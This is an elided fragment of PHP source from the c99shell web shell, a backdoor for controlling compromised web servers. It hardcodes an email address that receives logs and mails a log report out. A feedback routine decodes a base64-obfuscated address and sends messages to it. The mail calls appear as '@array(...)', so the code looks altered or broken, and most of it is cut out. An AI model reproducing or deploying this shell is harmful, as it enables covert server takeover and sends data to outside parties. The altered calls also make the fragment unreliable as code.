...
$log_email = "ebaymasteramerica1@gmail.com"; //Default e-mail for sending logs
 ...
 else
 {
  ...
  if (!empty($submit))
  {
   ...
   else
   {
    ...
    if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    if ($fqb_logemail) {@array($fqb_logemail,"c99shell v. ".$shver." report",$fqb_log);}
    fclose($fqb_logfp);
   }
  }
  else
...
if ($act == "feedback")
{
 $suppmail = base64_decode("ZmxvcmluX3NleF9mbG9yaW5AeWFob28uY29t");
 if (!empty($submit))
 {
  ...
  array($suppmail,"c99shell v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
